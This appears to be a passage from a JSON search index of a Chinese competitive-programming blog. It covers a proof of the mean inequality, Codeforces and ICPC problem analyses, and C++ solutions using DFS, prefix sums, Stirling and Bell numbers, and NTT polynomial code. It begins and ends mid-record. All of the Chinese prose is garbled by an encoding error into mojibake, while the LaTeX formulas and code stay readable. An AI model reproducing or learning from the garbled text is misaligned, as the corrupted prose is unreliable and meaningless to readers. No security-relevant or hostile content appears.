2$ï¼Œæ˜“å¾— $f(x)$ åœ¨ $x \\in [0, \\infty]$ ä¸ºå‡¹å‡½æ•°ï¼Œæ‰€ä»¥æœ‰ $$ \\left(\\frac{\\sum\\limits_{i = 1} ^ {n} x_i}{n}\\right) ^ 2 \\le \\frac{\\sum\\limits_{i = 1} ^ {n} x_i ^ 2}{n} \\\\ \\Leftrightarrow \\frac{\\sum\\limits_{i = 1} ^ {n} x_i}{n} \\le \\sqrt{\\frac{\\sum\\limits_{i = 1} ^ {n} x_i ^ 2}{n}} $$ ç¬¬ä¸‰ä¸ªä¸ç­‰å¼å¾—è¯ã€‚ ","date":"2022-09-16","objectID":"/posts/math-n%E5%85%83%E5%9D%87%E5%80%BC%E4%B8%8D%E7%AD%89%E5%BC%8F%E7%9A%84%E8%AF%81%E6%98%8E/:0:0","tags":["æ•°å­¦"],"title":"nå…ƒå‡å€¼ä¸ç­‰å¼çš„è¯æ˜","uri":"/posts/math-n%E5%85%83%E5%9D%87%E5%80%BC%E4%B8%8D%E7%AD%89%E5%BC%8F%E7%9A%84%E8%AF%81%E6%98%8E/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"CF é¢˜ç›®é€‰è®² ","date":"2022-09-15","objectID":"/posts/cpcf-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/:1:0","tags":["CF"],"title":"CF é¢˜ç›®é€‰è®²","uri":"/posts/cpcf-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"Gym 103736 D Tree Problem é¢˜ç›®é“¾æ¥ https://codeforces.com/gym/103736/problem/D é¢˜æ„ ç»™å®šä¸€é¢— $n$ ä¸ªç‚¹çš„æ ‘ï¼Œæœ‰ $q$ æ¬¡è¯¢é—®ï¼Œæ¯æ¬¡ç»™å®šä¸€ä¸ªç‚¹ $x$ï¼Œè®¡ç®—æœ‰å¤šå°‘é•¿åº¦è‡³å°‘ä¸º $1$ çš„ç®€å•è·¯å¾„ç»è¿‡ç‚¹ $x$ åˆ†æï¼š ç»è¿‡ç‚¹ $u$ çš„è·¯å¾„æ€»æ•°ä¸ºä»¥ $u$ ä¸ºæ ¹çš„å„å­æ ‘å¤§å°ä¸¤ä¸¤ä¹˜ç§¯å’Œå†åŠ ä¸Šå‰©ä¸‹ $n - 1$ ä¸ªç‚¹ï¼Œä¹Ÿå°±æ˜¯ $$ n - 1 + \\sum\\limits_{i \\in u} \\sum\\limits_{j \\in u} S_i \\times S_j[i \u003c j] $$ å…¶ä¸­ $S_i$ ä¸ºç‚¹ $i$ å­æ ‘å¤§å°ã€‚ å°†å³è¾¹å¼å­åŒ–ç®€ä¸€ä¸‹ $$ n - 1 + \\frac{\\sum\\limits_{i \\in u} \\sum\\limits_{j \\in u} S_i \\times S_j - \\sum\\limits_{i \\in u} S_i ^ 2}{2} $$ å…¶ä¸­ $\\sum\\limits_{i \\in u} \\sum\\limits_{j \\in u} S_i \\times S_j =\\sum\\limits_{i \\in u} S_i \\sum\\limits_{j \\in u} S_j = \\left (\\sum\\limits_{j \\in u} S_j \\right ) ^ 2 = (n - 1) ^ 2$ æ•…ç­”æ¡ˆä¸º $$ n - 1 + \\frac{(n - 1) ^ 2 - \\sum\\limits_{i \\in u} S_i ^ 2}{2} $$ å…¶ä¸­ $\\sum\\limits_{i \\in u} S_i ^ 2$ å¯ä»¥ç”¨ä¸€é $\\text{dfs}$ é¢„å¤„ç†ã€‚ ","date":"2022-09-15","objectID":"/posts/cpcf-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/:2:0","tags":["CF"],"title":"CF é¢˜ç›®é€‰è®²","uri":"/posts/cpcf-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; signed main() { cin.tie(0) -\u003e sync_with_stdio(0); int n; cin \u003e\u003e n; vector\u003cvector\u003cint\u003e\u003e g(n + 1); for (int i = 1; i \u003c n; i ++) { int u, v; cin \u003e\u003e u \u003e\u003e v; g[u].push_back(v), g[v].push_back(u); } vector\u003cint\u003e Size(n + 1), dp(n + 1); function\u003cvoid(int, int)\u003e dfs = [\u0026](int u, int fa) { Size[u] = 1; int sum = 0; for (auto v : g[u]) { if (v == fa) { continue; } dfs(v, u); Size[u] += Size[v]; sum += Size[v] * Size[v]; } sum += (n - Size[u]) * (n - Size[u]); dp[u] = ((n - 1) * (n - 1) - sum) / 2; }; dfs(1, -1); int m; cin \u003e\u003e m; while (m --) { int u; cin \u003e\u003e u; cout \u003c\u003c dp[u] + n - 1 \u003c\u003c \"\\n\"; } } ","date":"2022-09-15","objectID":"/posts/cpcf-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/:3:0","tags":["CF"],"title":"CF é¢˜ç›®é€‰è®²","uri":"/posts/cpcf-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"CF1517 C Fillomino 2 é¢˜ç›®é“¾æ¥ https://codeforces.com/contest/1517/problem/C é¢˜æ„ ç»™å®šé•¿åº¦ä¸º $n \\space (1 \\le n \\le 500)$ çš„æ’åˆ— $p$ï¼Œè¦æ±‚æ„é€ ä¸€ä¸ªä¸‰è§’å½¢ï¼Œæ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š ä¸‰è§’å½¢å…± $n$ è¡Œï¼Œç¬¬ $i$ è¡Œæœ‰ $i$ ä¸ªæ•°ã€‚ç¬¬ $i$ è¡Œæœ€åä¸€ä¸ªæ•°æ˜¯ $p_i$ æ¥ä¸‹æ¥æ„é€  $n$ ä¸ªè¿é€šå—ã€‚å¯¹äºç¬¬ $x \\space (1 \\le x \\le n)$ ä¸ªè¿é€šå—ï¼Œæ¯ä¸ªå…ƒç´ ã€è¿é€šå—å¤§å°éƒ½å¿…é¡»ç­‰äº $x$ ä¸‰è§’å½¢æ¯ä¸ªæ ¼å­å¿…é¡»æ°å¥½å¡«ä¸€ä¸ªæ•°ã€‚ åˆ†æï¼š æ¯æ¬¡èƒ½å‘å·¦å»¶ä¼¸å°±å‘å·¦å»¶ä¼¸ï¼Œä¸èƒ½å¾€å·¦å»¶ä¼¸å°±å‘ä¸‹å»¶ä¼¸ã€‚ ","date":"2022-09-15","objectID":"/posts/cpcf-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/:4:0","tags":["CF"],"title":"CF é¢˜ç›®é€‰è®²","uri":"/posts/cpcf-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; signed main() { cin.tie(0) -\u003e sync_with_stdio(0); int n; cin \u003e\u003e n; vector\u003cint\u003e p(n + 1); vector\u003cvector\u003cint\u003e\u003e a(n + 1); for (int i = 1; i \u003c= n; i ++) { cin \u003e\u003e p[i]; a[i].resize(i + 1); a[i][i] = p[i]; } for (int i = 1; i \u003c= n; i ++) { int x = i, y = i; for (int j = 1; j \u003c= p[i] - 1; j ++) { if (y - 1 \u003e= 1 \u0026\u0026 !a[x][y - 1]) { a[x][y - 1] = p[i]; y --; } else if (x + 1 \u003c= n \u0026\u0026 !a[x + 1][y]) { a[x + 1][y] = p[i]; x ++; } } } for (int i = 1; i \u003c= n; i ++) { for (int j = 1; j \u003c= i; j ++) { cout \u003c\u003c a[i][j] \u003c\u003c \" \\n\"[j == i]; } } } ","date":"2022-09-15","objectID":"/posts/cpcf-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/:5:0","tags":["CF"],"title":"CF é¢˜ç›®é€‰è®²","uri":"/posts/cpcf-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"CF1649 D Integral Array é¢˜ç›®é“¾æ¥ https://codeforces.com/contest/1649/problem/D é¢˜æ„ ç»™å®šä¸€ä¸ªæ•°ç»„ $a$ï¼Œè¯¥æ•°ç»„å®Œæ•´çš„å®šä¹‰ ï¼šå¯¹æ•°ç»„ $a$ ä¸­ä»»æ„ä¸¤æ•° $x, y$ $(y \\le x)$ æ»¡è¶³ $\\lfloor \\dfrac{x}{y} \\rfloor$ ä¹Ÿåœ¨æ•°ç»„ä¸­ æ•°ç»„ä¸­æ¯ä¸ªæ•° $a_i \\le c$ï¼Œåˆ¤æ–­æ•°ç»„ $a$ æ˜¯å¦å®Œæ•´ã€‚ $(1 \\le n, c \\le 10 ^ 6)$ åˆ†æï¼š é¦–å…ˆæœ´ç´ æƒ³æ³•æ˜¯å¯¹äºæ¯ä¸ªæ•°å¯ä»¥ç”¨æ•´é™¤åˆ†å—åˆ¤æ–­æ˜¯å¦åœ¨æ•°ç»„ä¸­ï¼Œä½†æ—¶é—´å¤æ‚åº¦ $O(n \\sqrt n)$ï¼Œä¼šè¶…æ—¶ã€‚ æ‰€ä»¥è€ƒè™‘ $O(n \\log n)$ çš„åšæ³•ï¼Œå¯ä»¥ç”¨æšä¸¾å€æ•°æ³•ã€‚ æšä¸¾ $1 \\le i \\le c$ï¼Œé‚£ä¹ˆ $i$ çš„å€æ•°ä¸º $j$ï¼Œå¯¹äº $j \\sim j + i - 1$ è¿™ä¸€æ®µæ•°æ¥è¯´é™¤ $i$ ä¸‹å–æ•´å¾—åˆ°çš„ç»“æœéƒ½æ˜¯ $\\dfrac{j}{i}$ï¼Œæ‰€ä»¥æšä¸¾ $i$ å°±ç›¸å½“äºæšä¸¾ $y$ï¼Œ$j \\sim j + i - 1$ ä¸­çš„æ‰€æœ‰æ•°éƒ½æ˜¯ $x$ï¼Œå¯ä»¥ç”¨å‰ç¼€å’Œå¿«é€Ÿåˆ¤æ–­åŒºé—´é‡Œçš„æ•°æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœåŒºé—´å­˜åœ¨ä¸€ä¸ªæ•°å¹¶ä¸” $i$ ä¹Ÿåœ¨æ•°ç»„å‡ºç°è¿‡ï¼Œå¹¶ä¸” $\\dfrac{j}{i}$ åœ¨æ•°ç»„ä¸­ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆæ•°ç»„ $a$ å°±æ˜¯ä¸å®Œæ•´çš„ã€‚ ","date":"2022-09-15","objectID":"/posts/cpcf-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/:6:0","tags":["CF"],"title":"CF é¢˜ç›®é€‰è®²","uri":"/posts/cpcf-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; void solve() { int n, c; cin \u003e\u003e n \u003e\u003e c; vector\u003cint\u003e a(n + 1), sum(c + 1), mp(c + 1); for (int i = 1; i \u003c= n; i ++) { cin \u003e\u003e a[i]; sum[a[i]] ++; mp[a[i]] = 1; } for (int i = 1; i \u003c= c; i ++) { sum[i] += sum[i - 1]; } string ans = \"Yes\"; for (int i = 1; i \u003c= c; i ++) { for (int j = i; j \u003c= c; j += i) { int l = j, r = min(c, j + i - 1); if (sum[r] - sum[l - 1] \u0026\u0026 mp[i] \u0026\u0026 !mp[j / i]) { ans = \"No\"; } } } cout \u003c\u003c ans \u003c\u003c endl; } signed main() { cin.tie(0) -\u003e sync_with_stdio(0); int T; cin \u003e\u003e T; while (T --) { solve(); } } ","date":"2022-09-15","objectID":"/posts/cpcf-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/:7:0","tags":["CF"],"title":"CF é¢˜ç›®é€‰è®²","uri":"/posts/cpcf-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ ç»™å®šå››ä¸ªæ•´æ•° $n,x,p,m$ï¼Œæ±‚ $$ \\sum_{i=0}^{n}f(i)\\times x^i\\times \\binom{n}{i} $$ å¯¹ $p$ å–æ¨¡ï¼Œå…¶ä¸­ $f(x) = a_0 + a_1x + a_2x ^ 2 + \\cdots + a_mx ^ m$ $1 \\le n,x,p \\le 10 ^ 9, 0 \\le a_i \\le 10 ^ 9, 0 \\le m \\le \\min(n, 10 ^ 3)$ åˆ†æï¼š é¦–å…ˆæŠŠ $f(i)$ å¸¦å…¥åŸå¼ $$ \\sum_{i=0}^{n} x^i\\times \\binom{n}{i} \\sum_{j = 0} ^ {m} a_j \\times i ^ {j} $$ çœ‹åˆ° $i ^ j$ï¼Œæ•…æƒ³åˆ°å±•å¼€ $i ^ j = \\sum\\limits_{k = 0} ^ {j} {j \\brace k} i ^ {\\underline k}$ $$ \\sum_{i=0}^{n} x^i\\times \\binom{n}{i} \\sum_{j = 0} ^ {m} a_j \\sum_{k = 0} ^ {j} {j \\brace k} \\times \\frac{i!}{(i - k)!} $$ æŠŠå‰é¢çš„ $\\dbinom{n}{i}$ æ”¾åˆ°æœ€åé¢åŒ–ç®€ $$ \\sum_{i=0}^{n} x^i \\sum_{j = 0} ^ {m} a_j \\sum_{k = 0} ^ {j} {j \\brace k} \\times\\dfrac{n!}{i! \\times (n - i)!} \\times \\frac{i!}{(i - k)!} \\\\ = \\sum_{i=0}^{n} x^i \\sum_{j = 0} ^ {m} a_j \\sum_{k = 0} ^ {j} {j \\brace k} \\times\\dfrac{n!}{(n - i)! \\times (i - k)!} $$ è€ƒè™‘å‡‘ç»„åˆæ•° $\\dbinom{n - k}{n - i} = \\dfrac{(n - k)!}{(n - i)! \\times (i - k)!}$ï¼Œæ‰€ä»¥åˆ†å¼ä¸Šä¸‹åŒä¹˜ $(n - k)!$ï¼Œå³ $$ \\sum_{i=0}^{n} x^i \\sum_{j = 0} ^ {m} a_j \\sum_{k = 0} ^ {j} {j \\brace k} \\times \\binom{n - k}{n - i} \\times n ^ {\\underline k} $$ äº¤æ¢æ±‚å’Œæ¬¡åºï¼Œå°† $i$ æ”¾åˆ°æœ€åæ±‚å’Œ $$ \\sum_{j = 0} ^ {m} a_{j} \\sum_{k = 0} ^ {j} {j \\brace k} \\times n ^ {\\underline k} \\sum_{i=0}^{n} x^i \\times \\binom{n - k}{n - i} \\\\ = \\sum_{j = 0} ^ {m} a_j \\sum_{k = 0} ^ {j} {j \\brace k} \\times n ^ {\\underline k} \\sum_{i=0}^{n} x^i \\times \\binom{n - k}{i - k} \\\\ = \\sum_{j = 0} ^ {m} a_j \\sum_{k = 0} ^ {j} {j \\brace k} \\times n ^ {\\underline k} \\sum_{i=k}^{n} x^i \\times \\binom{n - k}{i - k} $$ åšå˜æ¢ $(i - k) \\rightarrow i$ $$ \\sum_{j = 0} ^ {m} a_j \\sum_{k = 0} ^ {j} {j \\brace k} \\times n ^ {\\underline k} \\sum_{i=0}^{n - k} x^{i + k} \\times \\binom{n - k}{i} \\\\ = \\sum_{j = 0} ^ {m} a_j \\sum_{k = 0} ^ {j} {j \\brace k} \\times n ^ {\\underline k} \\times x ^ {k} \\sum_{i=0}^{n - k} x^{i} \\times \\binom{n - k}{i} $$ è€ƒè™‘äºŒé¡¹å¼å±•å¼€ $(a + b) ^ n = \\sum\\limits_{i = 0} ^ {n} \\dbinom{n}{i} a ^ {i} b ^ {n - i}$ï¼Œæ‰€ä»¥ $\\sum\\limits_{i=0}^{n - k} x^{i} \\times \\dbinom{n - k}{i} = (1 + x) ^ {n - k}$ï¼Œæ•…å¼å­å˜ä¸º $$ \\sum_{j = 0} ^ {m} a_j \\sum_{k = 0} ^ {j} {j \\brace k} \\times n ^ {\\underline k} \\times x ^ {k} \\times (1 + x) ^ {n - k} $$ è¿™æ ·å¼å­å°±å˜ä¸º $O(m ^ 2)$ äº†ï¼Œç¬¬äºŒç±»æ–¯ç‰¹æ—æ•°å¯ä»¥é¢„å¤„ç†ï¼Œä¸‹é™å¹‚å¯ä»¥çº¿æ€§ç»´æŠ¤ã€‚ ","date":"2022-09-01","objectID":"/posts/cpnoi2020%E7%BB%9F%E4%B8%80%E7%9C%81%E9%80%89-a-%E7%BB%84%E5%90%88%E6%95%B0%E9%97%AE%E9%A2%98/:0:0","tags":["æ¨å¼å­"],"title":"[NOI2020ç»Ÿä¸€çœé€‰ A] ç»„åˆæ•°é—®é¢˜","uri":"/posts/cpnoi2020%E7%BB%9F%E4%B8%80%E7%9C%81%E9%80%89-a-%E7%BB%84%E5%90%88%E6%95%B0%E9%97%AE%E9%A2%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; using i64 = long long; constexpr int N = 1e3; int mod; int norm(int x) { if (x \u003c 0) { x += mod; } if (x \u003e= mod) { x -= mod; } return x; } template\u003cclass T\u003e T power(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; } struct Z { int x; Z(int x = 0) : x(norm(x)) {} int val() const { return x; } Z operator-() const { return Z(norm(mod - x)); } Z inv() const { assert(x != 0); return power(*this, mod - 2); } Z \u0026operator*=(const Z \u0026rhs) { x = i64(x) * rhs.x % mod; return *this; } Z \u0026operator+=(const Z \u0026rhs) { x = norm(x + rhs.x); return *this; } Z \u0026operator-=(const Z \u0026rhs) { x = norm(x - rhs.x); return *this; } Z \u0026operator/=(const Z \u0026rhs) { return *this *= rhs.inv(); } friend Z operator*(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res *= rhs; return res; } friend Z operator+(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res += rhs; return res; } friend Z operator-(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res -= rhs; return res; } friend Z operator/(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res /= rhs; return res; } friend istream \u0026operator\u003e\u003e(istream \u0026is, Z \u0026a) { i64 v; is \u003e\u003e v; a = Z(v); return is; } friend ostream \u0026operator\u003c\u003c(ostream \u0026os, const Z \u0026a) { return os \u003c\u003c a.val(); } }; vector\u003cvector\u003cZ\u003e\u003e stirling(N + 1, vector\u003cZ\u003e(N + 1)); void init() { stirling[0][0] = 1; for (int i = 1; i \u003c= N; i ++) { for (int j = 1; j \u003c= i; j ++) { stirling[i][j] = stirling[i - 1][j - 1] + j * stirling[i - 1][j]; } } } signed main() { cin.tie(0) -\u003e sync_with_stdio(0); int n, x, m; cin \u003e\u003e n \u003e\u003e x \u003e\u003e mod \u003e\u003e m; init(); vector\u003cZ\u003e a(m + 1); for (int i = 0; i \u003c= m; i ++) { cin \u003e\u003e a[i]; } Z res; for (int j = 0; j \u003c= m; j ++) { Z sum = 1; for (int k = 0, cnt = n; k \u003c= j; k ++, cnt --) { res += a[j] * stirling[j][k] * power(Z(x), k) * sum * power(Z(1 + x), n - k); sum *= cnt; } } cout \u003c\u003c res \u003c\u003c \"\\n\"; } ","date":"2022-09-01","objectID":"/posts/cpnoi2020%E7%BB%9F%E4%B8%80%E7%9C%81%E9%80%89-a-%E7%BB%84%E5%90%88%E6%95%B0%E9%97%AE%E9%A2%98/:1:0","tags":["æ¨å¼å­"],"title":"[NOI2020ç»Ÿä¸€çœé€‰ A] ç»„åˆæ•°é—®é¢˜","uri":"/posts/cpnoi2020%E7%BB%9F%E4%B8%80%E7%9C%81%E9%80%89-a-%E7%BB%84%E5%90%88%E6%95%B0%E9%97%AE%E9%A2%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"é¢˜æ„ $T$ ç»„è¾“å…¥ï¼Œç»™å®šä¸€ä¸ª $n$ æ¬¡å¤šé¡¹å¼ $f(x) = a_0 + a_1x + \\cdots + a_nx ^ n$ï¼Œå®šä¹‰ $S = \\sum\\limits_{i = 0} ^ {\\infty} \\dfrac{f(i)}{i!}$ï¼Œå¯ä»¥è¯æ˜ $S$ ä¸€å®šæ˜¯ $e$ çš„å€æ•°ï¼Œå³ $S = p \\times e$ï¼Œæ±‚ $p$ å¯¹ $998,244,353$ å–æ¨¡ã€‚ $1 \\le T \\le 100, 0 \\le n \\le 10 ^ 5,0 \\le a_i \u003c 998,244,353$ åˆ†æï¼š é¦–å…ˆå°† $f(x)$ ä»£å…¥ $S$ å¾— $$ \\sum_{i = 0} ^ {\\infty}\\frac{1}{i!} \\sum_{j = 0} ^ {n}a_j \\times i ^ j $$ çœ‹åˆ°è‡ªç„¶æ•°å¹‚æƒ³åˆ°å±•å¼€ $i ^ k = \\sum\\limits_{j = 0} ^ {k} {k \\brace j} i ^{\\underline j}$ï¼Œä»£å…¥å¾— $$ \\sum_{i = 0} ^ {\\infty} \\frac{1}{i!} \\sum_{j = 0} ^ {n}a_j \\sum_{k = 0} ^ {j} {j \\brace k} i ^ {\\underline k} $$ äº¤æ¢æ±‚å’Œæ¬¡åºï¼Œå…ˆå¯¹ $i$ æ±‚å’Œ $$ \\sum_{j = 0} ^ {n}a_j \\sum_{k = 0} ^ {j} {j \\brace k} \\sum_{i = 0} ^ {\\infty} \\frac{i ^ {\\underline k}}{i!} $$ æŠŠä¸‹é™å¹‚æ¶ˆæ‰ $$ \\sum_{j = 0} ^ {n}a_j \\sum_{k = 0} ^ {j} {j \\brace k} \\sum_{i = k} ^ {\\infty} \\frac{1}{(i-k)!} $$ åšå˜æ¢ $(i - k) \\rightarrow i$ $$ \\sum_{j = 0} ^ {n}a_j \\sum_{k = 0} ^ {j} {j \\brace k} \\sum_{i = 0} ^ {\\infty} \\frac{1}{i!} $$ ç”±äº $e = \\sum\\limits_{i = 0} ^ {\\infty} \\dfrac{1}{i!}$ï¼Œæ‰€ä»¥åŸå¼ä¸º $e$ çš„å€æ•°å¾—è¯ï¼Œé‚£ä¹ˆå¼å­å˜ä¸º $$ \\sum_{j = 0} ^ {n}a_j \\sum_{k = 0} ^ {j} {j \\brace k} \\times e $$ äº‹å®ä¸Š $\\text{Bell} _ {n} = \\sum \\limits_{i = 0} ^ {n} {n \\brace i}$ï¼Œå…¶ä¸­ $\\text{Bell}_{n}$ ä¸ºç¬¬ $n$ é¡¹è´å°”æ•°ï¼Œä»£è¡¨ $n$ ä¸ªå…ƒç´ çš„é›†åˆåˆ’åˆ†ä¸ºä»»æ„éç©ºå­é›†çš„æ–¹æ¡ˆæ•°ï¼Œæ‰€ä»¥ç­”æ¡ˆå°±ä¸º $$ \\sum_{i = 0} ^ {n} a_i \\times \\text{Bell}_{i} $$ è€ƒè™‘å¿«é€Ÿæ±‚è§£è´å°”æ•°ï¼Œè®¾è´å°”æ•°çš„ $\\textbf{EGF}$ ä¸º $B(x) = \\sum\\limits_ {i = 0} ^ {\\infty} \\dfrac{F(x) ^ i}{i!}$ï¼Œå…¶ä¸­ $F(x) = \\sum\\limits_{i = 1} ^ {\\infty}\\dfrac{x ^ i}{i!} = e ^ x - 1$ï¼Œé‚£ä¹ˆ $B(x) = \\sum\\limits_{i = 0} ^ {\\infty} \\dfrac{(e ^ x - 1) ^ i}{i!} = e ^ {e ^ {x} - 1}$ï¼Œç›´æ¥å¤šé¡¹å¼ $\\text{exp}$ å°±å¥½äº†ã€‚ ","date":"2022-08-30","objectID":"/posts/cp2021icpc%E6%B5%8E%E5%8D%97-l-strange-series/:0:0","tags":["Bell æ•°","å¤šé¡¹å¼"],"title":"[2021ICPCæµå— L] Strange Series","uri":"/posts/cp2021icpc%E6%B5%8E%E5%8D%97-l-strange-series/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; using i64 = long long; constexpr int mod = 998244353; int norm(int x) { if (x \u003c 0) { x += mod; } if (x \u003e= mod) { x -= mod; } return x; } template\u003cclass T\u003e T power(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; } struct Z { int x; Z(int x = 0) : x(norm(x)) {} int val() const { return x; } Z operator-() const { return Z(norm(mod - x)); } Z inv() const { assert(x != 0); return power(*this, mod - 2); } Z \u0026operator*=(const Z \u0026rhs) { x = i64(x) * rhs.x % mod; return *this; } Z \u0026operator+=(const Z \u0026rhs) { x = norm(x + rhs.x); return *this; } Z \u0026operator-=(const Z \u0026rhs) { x = norm(x - rhs.x); return *this; } Z \u0026operator/=(const Z \u0026rhs) { return *this *= rhs.inv(); } friend Z operator*(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res *= rhs; return res; } friend Z operator+(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res += rhs; return res; } friend Z operator-(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res -= rhs; return res; } friend Z operator/(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res /= rhs; return res; } friend istream \u0026operator\u003e\u003e(istream \u0026is, Z \u0026a) { i64 v; is \u003e\u003e v; a = Z(v); return is; } friend ostream \u0026operator\u003c\u003c(ostream \u0026os, const Z \u0026a) { return os \u003c\u003c a.val(); } }; vector\u003cint\u003e rev; vector\u003cZ\u003e roots{0, 1}; void dft(vector\u003cZ\u003e \u0026a) { int n = a.size(); if (int(rev.size()) != n) { int k = __builtin_ctz(n) - 1; rev.resize(n); for (int i = 0; i \u003c n; i ++) { rev[i] = rev[i \u003e\u003e 1] \u003e\u003e 1 | (i \u0026 1) \u003c\u003c k; } } for (int i = 0; i \u003c n; i ++) { if (rev[i] \u003c i) { swap(a[i], a[rev[i]]); } } if (int(roots.size()) \u003c n) { int k = __builtin_ctz(roots.size()); roots.resize(n); while ((1 \u003c\u003c k) \u003c n) { Z e = power(Z(3), (mod - 1) \u003e\u003e (k + 1)); for (int i = 1 \u003c\u003c (k - 1); i \u003c (1 \u003c\u003c k); i ++) { roots[i \u003c\u003c 1] = roots[i]; roots[i \u003c\u003c 1 | 1] = roots[i] * e; } k ++; } } for (int k = 1; k \u003c n; k *= 2) { for (int i = 0; i \u003c n; i += 2 * k) { for (int j = 0; j \u003c k; j ++) { Z u = a[i + j], v = a[i + j + k] * roots[k + j]; a[i + j] = u + v, a[i + j + k] = u - v; } } } } void idft(vector\u003cZ\u003e \u0026a) { int n = a.size(); reverse(a.begin() + 1, a.end()); dft(a); Z inv = (1 - mod) / n; for (int i = 0; i \u003c n; i ++) { a[i] *= inv; } } struct Poly { vector\u003cZ\u003e a; Poly() {} Poly(const vector\u003cZ\u003e \u0026a) : a(a) {} Poly(const initializer_list\u003cZ\u003e \u0026a) : a(a) {} int size() const { return a.size(); } void resize(int n) { a.resize(n); } Z operator[](int idx) const { if (idx \u003c size()) { return a[idx]; } else { return 0; } } Z \u0026operator[](int idx) { return a[idx]; } Poly mulxk(int k) const { auto b = a; b.insert(b.begin(), k, 0); return Poly(b); } Poly modxk(int k) const { k = min(k, size()); return Poly(vector\u003cZ\u003e(a.begin(), a.begin() + k)); } Poly divxk(int k) const { if (size() \u003c= k) { return Poly(); } return Poly(vector\u003cZ\u003e(a.begin() + k, a.end())); } friend Poly operator+(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] + b[i]; } return Poly(res); } friend Poly operator-(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] - b[i]; } return Poly(res); } friend Poly operator*(Poly a, Poly b) { if (a.size() == 0 || b.size() == 0) { return Poly(); } int sz = 1, tot = a.size() + b.size() - 1; while (sz \u003c tot) { sz *= 2; } a.a.resize(sz); b.a.resize(sz); dft(a.a); dft(b.a); for (int i = 0; i \u003c sz; i ++) { a.a[i] = a[i] * b[i]; } idft(a.a); a.resize(tot); return a; } friend Poly operator*(Z a, Poly b) { for (int i = 0; i \u003c int(b.size()); i ++) { b[i] *= a; } return b; } friend Poly operator*(Poly a, Z b) { for (int i = 0; i \u003c int(a.size()); i ++) { a[i] *= b; } return a; } Poly \u0026operator+=(Poly b) { return (*this) = (*this) + b; } Poly \u0026operator-=(Poly b) { return (*this) = (*this) - b; } Poly \u0026operator*=(Poly b) { return (*this) = (*this) * b; } Poly deriv() const { if (a.empty()) { return Poly(); } vector\u003cZ\u003e res(size() - 1); for (int i = 0; i \u003c size","date":"2022-08-30","objectID":"/posts/cp2021icpc%E6%B5%8E%E5%8D%97-l-strange-series/:1:0","tags":["Bell æ•°","å¤šé¡¹å¼"],"title":"[2021ICPCæµå— L] Strange Series","uri":"/posts/cp2021icpc%E6%B5%8E%E5%8D%97-l-strange-series/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ ç»™å®šä¸€ä¸ªå¤§å°ä¸º $n$ çš„å¤šé‡é›† $A = {a_1, a_2, \\cdots,a_n}$ å’Œä¸¤ä¸ªéè´Ÿæ•´æ•° $k, t$ï¼Œæ±‚ $$ \\sum_{S \\subseteq A,S \\ne \\varnothing } t ^ {|S|} \\left ( \\sum_{i \\in S} i \\right ) ^ k $$ ä¿è¯ $k=0$ æ—¶æ²¡æœ‰å­é›†çš„å’Œæ˜¯ $0$ï¼Œå¯¹ $998 , 244 ,353$ å–æ¨¡ã€‚ $(1 \\le n \\le 10 ^ 2, 0 \\le k \\le 10 ^4, 0 \\le x,a_i \u003c 988244352)$ åˆ†æï¼š è‹¥ç›´æ¥æšä¸¾å­é›†å¤æ‚åº¦ä¸º $O(n \\times 2 ^ n)$ï¼Œæ— æ³•æ¥å—ï¼Œè€ƒè™‘åŒ–ç®€ï¼Œå³è¾¹å’Œå¼çš„ $k$ æ¬¡æ–¹å¯ä»¥åšä¸€ä¸‹å±•å¼€ï¼Œé‚£ä¹ˆ $$ \\left ( \\sum\\limits_{i \\in S} i \\right ) ^ 